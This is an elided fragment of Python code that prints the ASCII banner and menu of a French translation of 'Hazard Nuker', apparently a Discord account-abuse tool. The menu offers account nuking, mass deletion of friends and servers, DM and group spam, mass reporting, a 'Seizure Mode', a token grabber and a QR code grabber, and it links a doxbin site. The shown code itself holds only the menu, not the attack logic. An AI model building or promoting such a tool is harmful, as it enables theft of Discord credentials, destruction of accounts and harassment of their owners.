    ...
    if theme == "dark":
        ...
        print(f'''{Fore.GREEN}
                                 ...
                                 ▀▀ █▪ ▀█▄▀▪▀▀ █▪  ▀▀▀▀▀•  ▀▀▀   ·▀▀▀ • ▀▀▀  ▀▀▀  ▀▀▀▀ 
                                    ...
                                    ██║  ██║██║  ██║███████╗██║  ██║██║  ██║██████╔╝          
                                    ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝      
Traduction Du Hazard Nuker par https://discord.gg/ligue-occulte                                          '''.replace('█', f'{Fore.WHITE}█{Fore.GREEN}') + f'''   
{Fore.WHITE}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────{Fore.RESET}
{Fore.RESET}[{Fore.GREEN}1{Fore.RESET}]{Fore.LIGHTBLACK_EX} Nuke Le Compte                              |{Fore.RESET}[{Fore.GREEN}10{Fore.RESET}]{Fore.LIGHTBLACK_EX} Block Friends
{Fore.RESET}[{Fore.GREEN}2{Fore.RESET}]{Fore.LIGHTBLACK_EX} Supprimer tous les amis                     |{Fore.RESET}[{Fore.GREEN}11{Fore.RESET}]{Fore.LIGHTBLACK_EX} Profile Changer
{Fore.RESET}[{Fore.GREEN}3{Fore.RESET}]{Fore.LIGHTBLACK_EX} Supprimer et quitter tous les serveurs      |{Fore.RESET}[{Fore.GREEN}12{Fore.RESET}]{Fore.LIGHTBLACK_EX} [Coming Soon] 
{Fore.RESET}[{Fore.GREEN}4{Fore.RESET}]{Fore.LIGHTBLACK_EX} Spam de créations de nouveau serveurs       |{Fore.RESET}[{Fore.GREEN}13{Fore.RESET}]{Fore.LIGHTBLACK_EX} Create Token Grabber 
{Fore.RESET}[{Fore.GREEN}5{Fore.RESET}]{Fore.LIGHTBLACK_EX} Supprimeur de DM                            |{Fore.RESET}[{Fore.GREEN}14{Fore.RESET}]{Fore.LIGHTBLACK_EX} QR Code grabber
...
{Fore.RESET}[{Fore.GREEN}7{Fore.RESET}]{Fore.LIGHTBLACK_EX} Activé le Seizure Mode                      |{Fore.RESET}[{Fore.GREEN}16{Fore.RESET}]{Fore.LIGHTBLACK_EX} GroupChat Spammer
{Fore.RESET}[{Fore.GREEN}8{Fore.RESET}]{Fore.LIGHTBLACK_EX} Avoir les informations du compte            |{Fore.RESET}[{Fore.GREEN}17{Fore.RESET}]{Fore.LIGHTBLACK_EX} Webhook Destroyer
{Fore.RESET}[{Fore.GREEN}9{Fore.RESET}]{Fore.LIGHTBLACK_EX} Se Connecter Au Compte                      |{Fore.RESET}[{Fore.GREEN}18{Fore.RESET}]{Fore.RED} Settings
{Fore.WHITE}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────''')
...
Traduction Du Hazard Nuker par https://discord.gg/ligue-occulte
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[1] Nuke le compte                              |[10] Bloquer les amis
[2] Supprimer tous les amis                     |[11] Changeur De Profile
[3] Supprimer et quitter tous les serveurs      |[12] [https://doxbin.net/]
[4] Spam de créations de nouveau serveurs       |[13] Crée Un Token Grabber
[5] Supprimeur de DM                            |[14] QR Code Grabber
[6] Mass Dm                                     |[15] Mass Report
[7] Activé le Seizure Mode                      |[16] Spammer de Groupes
[8] Avoir Les informations du compte            |[17] Destructeur de Webhook
[9] Se Connecter au compte                      |[18] Paramètres
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────''')
